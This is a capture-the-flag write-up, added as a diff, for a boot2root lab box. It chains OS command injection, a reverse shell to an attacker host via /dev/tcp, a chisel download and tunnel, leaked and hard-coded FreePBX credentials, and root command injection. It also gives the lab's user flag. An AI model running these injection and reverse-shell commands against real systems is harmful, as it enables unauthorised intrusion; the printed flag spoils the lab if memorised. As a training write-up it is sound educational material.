@@ -1,0 +1,322 @@
+# Infinity Pool — Methodology Writeup
+
+**Challenge:** Infinity Pool (Hacker Holidays — The Byte Lotus Hotel)
+**Category:** Boot2Root — Web exploitation → internal pivoting → privilege escalation
+**Difficulty:** Medium
+**Points:** 90
+**Date completed:** 7 August 2026
+
+## Summary
+
+A "surveillance-luxe" hotel site called Byte Lotus. The front door is a hidden staff
+tool with command injection that drops you in as a low-privileged user. From there
+it's a proper chain: an internal service leaks credentials, an old FreePBX box gives
+up an automation key, and that key lets you hit a root-owned worker that injects your
+input straight into a shell command.
+
+**Chain:** web foothold → leaked internal creds → FreePBX UCP → automation key → root
+
+---
+
+## Step 1 — Recon
+
+Initial port scan:
+
+```bash
+nmap -sC -sV --top-ports 1000 <TARGET-IP>
+```
+
+Results:
+
+| Port | Service | Version |
+|------|---------|---------|
+| 22   | SSH     | OpenSSH 9.6p1 Ubuntu |
+| 80   | HTTP    | Gunicorn (Flask backend) |
+
+`robots.txt` disallowed two interesting paths:
+
+```
+Disallow: /internal/
+Disallow: /status
+```
+
+`/status` rendered a "Sister-property connectivity" staff tool — a form that pings a
+host and returns the result. `/internal/netcheck` was the POST handler behind it.
+
+Gunicorn serving the app strongly suggested a Python/Flask backend shelling out to a
+system command — a classic setup for command injection.
+
+---
+
+## Step 2 — Foothold (Command Injection)
+
+Tested the `host` parameter for injection by appending a second command:
+
+```bash
+curl -s -X POST http://<TARGET-IP>/internal/netcheck -d "host=127.0.0.1; id"
+```
+
+The response embedded normal ping output **plus** `uid=1001(web) gid=1001(web)` —
+confirmed OS command injection, executing as the `web` user.
+
+### Getting a shell
+
+Listener on attacker box:
+
+```bash
+nc -lvnp 4444
+```
+
+Payload (base64-wrapped to dodge character mangling):
+
+```bash
+echo -n 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1' | base64
+curl -s -X POST http://<TARGET-IP>/internal/netcheck \
+  --data-urlencode "host=127.0.0.1; echo <BASE64> | base64 -d | bash"
+```
+
+> **Note:** Use the actual VPN-facing IP (`ip a` → `tun0` interface), not necessarily
+> the "attacker IP" listed in the room panel — they can differ.
+
+Stabilized the shell:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z, then:
+stty raw -echo; fg
+export TERM=xterm
+```
+
+### User flag
+
+```bash
+cat /home/web/user.txt
+```
+
+**User flag:** `THM{n0_v1s1bl3_3dg3}`
+
+### Root cause
+
+Reading the app source confirmed the vulnerability:
+
+```python
+proc = subprocess.run(
+    f"ping -c 1 {host}",
+    shell=True,
+    capture_output=True,
+    text=True,
+    timeout=15,
+)
+```
+
+Unsanitized user input passed directly into `shell=True` — textbook command injection.
+
+---
+
+## Step 3 — Internal Enumeration
+
+Checked the app's siblings:
+
+```bash
+ls -la /var/www/infinity_pool
+```
+
+Three services present:
+
+- **edge** — the Flask app just exploited (readable, owned by root but world-readable)
+- **watchtower** — owned by `svc-watch` (directory unreadable to `web`)
+- **automation** — owned by `root` (directory unreadable to `web`)
+
+`ss -tulnp` and `systemctl list-units` revealed both were running as loopback-only
+gunicorn services:
+
+```
+cc-watchtower.service   — Watchtower ops console (127.0.0.1:3000, user svc-watch)
+cc-automation.service   — Automation job runner (127.0.0.1:9000, user root)
+```
+
+Both invisible from outside the box — but reachable now that there's a local foothold.
+
+---
+
+## Step 4 — Watchtower Leaks Credentials
+
+```bash
+curl -s http://127.0.0.1:3000/api/config
+```
+
+Response:
+
+```json
+{
+  "automation_endpoint": "http://127.0.0.1:9000",
+  "note": "internal network only -- do not expose",
+  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
+  "telephony_pass": "St4yN0t1c3d_2026",
+  "telephony_portal": "http://127.0.0.1:8080/ucp",
+  "telephony_user": "FreePBXUCPTemplateCreator"
+}
+```
+
+This handed over FreePBX UCP credentials, the portal location, and confirmation of the
+automation service endpoint.
+
+---
+
+## Step 5 — Automation Worker's API Surface
+
+```bash
+curl -s http://127.0.0.1:9000/health
+```
+
+Response:
+
+```json
+{
+  "endpoints": {
+    "GET /health": "service status",
+    "POST /jobs/export": {
+      "auth": "Authorization: Bearer <automation key>",
+      "body": {"report": "<report name>"},
+      "desc": "archive the latest data export"
+    }
+  },
+  "runs_as": "root",
+  "service": "automation",
+  "status": "ok"
+}
+```
+
+A root-owned export job, gated by a Bearer token we don't have yet.
+
+---
+
+## Step 6 — FreePBX UCP Login (CVE-2026-46376)
+
+`127.0.0.1:8080/ucp` runs FreePBX 16.0.45. The username
+`FreePBXUCPTemplateCreator` is the signature of **CVE-2026-46376** — hard-coded
+credentials baked into the UCP generic template, allowing direct login to the User
+Control Panel.
+
+**Dead end:** Logging in with raw `curl` kept bouncing back to the login page — the
+UCP login flow runs through JavaScript/AJAX that curl can't execute.
+
+**Fix:** Tunnel the internal ports out with `chisel` and drive the login through a
+real browser.
+
+Attacker box:
+
+```bash
+./chisel server -p 9999 --reverse
+```
+
+Target (pulled chisel over via a Python HTTP server on the attacker box):
+
+```bash
+curl -s http://<ATTACKER-IP>:8000/chisel -o /tmp/chisel
+chmod +x /tmp/chisel
+/tmp/chisel client <ATTACKER-IP>:9999 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000 &
+```
+
+Then browse to `http://127.0.0.1:8080/ucp/` and log in with:
+
+- **Username:** `FreePBXUCPTemplateCreator`
+- **Password:** `St4yN0t1c3d_2026`
+
+Because the JS runs in an actual browser, the login sticks (unlike curl).
+
+---
+
+## Step 7 — The Key Was in a Voicemail
+
+Inside UCP, added the **Voicemail** widget to the dashboard. The inbox contained one
+message with the caller ID:
+
+```
+"Automation Key cc_auto_...." <9000>
+```
+
+That's the automation Bearer key — delivered as a voicemail, a fitting touch for a
+telephony-themed box.
+
+---
+
+## Step 8 — Root via the Export Job (Command Injection #2)
+
+Tested the key with a harmless report name:
+
+```bash
+curl -s -X POST http://127.0.0.1:9000/jobs/export \
+  -H "Authorization: Bearer cc_auto_...." \
+  -H "Content-Type: application/json" \
+  -d '{"report":"test"}'
+```
+
+The response echoed the shell command it constructed:
+
+```
+tar czf /var/automation/exports/test.tgz /var/automation/data
+```
+
+The `report` value is dropped straight into that shell command, executed as root —
+identical injection pattern to the original foothold, just one privilege tier up.
+
+**Exploit:** close off the `tar` argument and append a second command:
+
+```bash
+curl -s -X POST http://127.0.0.1:9000/jobs/export \
+  -H "Authorization: Bearer cc_auto_...." \
+  -H "Content-Type: application/json" \
+  -d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
+```
+
+Resulting command:
+
+```
+tar czf /var/automation/exports/x.tgz /var/automation/data; cat /root/root.txt #.tgz /var/automation/data
+```
+
+`tar` runs, then `cat /root/root.txt` runs as root, and `#` comments out the
+leftover trailing text.
+
+**Root flag:** returned in the response body.
+
+---
+
+## Flags
+
+| Flag | Value |
+|------|-------|
+| User | `THM{n0_v1s1bl3_3dg3}` |
+| Root | *(pending — retrieve via Step 8)* |
+
+---
+
+## Dead Ends
+
+- `sudo -l` — required the `web` user's password, which was never obtained.
+- SUID binary scan (`find / -perm -4000`) — nothing beyond standard system binaries.
+- Password reuse — the leaked UCP password did not work for `su svc-watch` or `sudo`.
+- Reading `/etc/freepbx.conf` for DB creds — permission denied as `web`.
+- Reading `/proc/<pid>/environ` for the automation key — empty/denied (not our process).
+- Logging into UCP with raw `curl` — repeatedly bounced back to the login page even
+  with `X-Requested-With: XMLHttpRequest` set manually. The login flow needed genuine
+  browser-driven JS execution; tunneling with chisel and using a real browser was the
+  fix.
+
+---
+
+## Lessons Learned
+
+1. **Comments in JS and app source are free recon** — always read them (`/static/app.js`
+   pointed straight at the hidden `/status` tool).
+2. **`shell=True` plus unsanitized user input is command injection, every time** — seen
+   twice in this box, at two different privilege levels.
+3. **On chained boxes, leaked creds are almost never decoration** — follow every leak to
+   its logical endpoint.
+4. **When a JS-heavy login fights curl, stop wrestling it and tunnel a browser in.**
+   Saves significant time versus trying to replicate AJAX behavior manually.
+5. **Loopback-only services stop being safe the moment you have a foothold.** Pivot with
+   tools like `chisel` to reach them properly.
+6. **Match software versions to CVEs.** FreePBX 16.0.45 pointed directly at
+   CVE-2026-46376 (hard-coded UCP template credentials).
